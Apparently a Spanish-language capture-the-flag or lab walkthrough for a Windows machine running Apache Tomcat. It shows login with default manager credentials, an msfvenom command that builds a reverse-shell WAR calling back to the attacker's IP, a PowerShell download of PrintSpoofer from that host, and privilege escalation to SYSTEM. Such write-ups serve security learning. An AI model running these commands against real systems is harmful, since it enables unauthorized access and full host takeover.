135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy

-En el puerto 8080 hay un Apache Tomcat, que es un servidor web basado en java.

-El acceso al Dashboard lo hacemos de la siguiente manera:
	-Nos vamos a la ruta /manager y nos pide usuario y contraseña
	-Probamos con credenciales por defecto, buscamos aquí:
		https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

-Las credenciales válidas son --> admin:tomcat

-Una vez dentro , subimos un Payload .war con msfvenom:
	-Generamos Payload .war:
		-msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.135 LPORT=1234 -f war -o shell.war
	-En el Dashboard:
		-WAR file to deploy --> Browse --> shell.war --> deploy

-Una vez subido , nos ponemos a la escucha y hacemos click en el archivo 'shell.war':
	C:\Program Files\Apache Software Foundation\Tomcat 11.0>whoami
	nt authority\local service 	(Hemos obtenido acceso inicial!!)

## Escalada de Privilegios

-He intentado hacer un upgrade de la shell a meterpreter para escalar privilegios de forma más sencilla, pero no lo he conseguido.

-Listamos los privilegios que tenemos:
	-whoami /priv
		-Tenemos --> SeImpersonatePrivilege

-Podemos escalar a NT\AUTHORITY SYSTEM con 2 exploits:
	-JuicyPotato.exe y PrintSpoofer64.exe

-En esta máquina solo funciona --> PrintSpoofer64.exe

#### Explotación de PrintSpoofer64.exe

-Lo descargamos desde aquí:
	[PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe)

-Creamos directorio temp en C:\temp

-Descargamos el archivo en la máquina víctima:
	-powershell -c "Invoke-WebRequest -Uri 'http://192.168.1.135/PrintSpoofer64.exe' -Outfile 'C:\temp\PrintSpoofer64.exe'"

-Lo ejecutamos de la siguiente forma:
	-PrintSpoofer64.exe -i -c cmd
		C:\Windows\system32>whoami
		nt authority\system

YA SOMOS NT\AUTHORITY SYSTEM!!
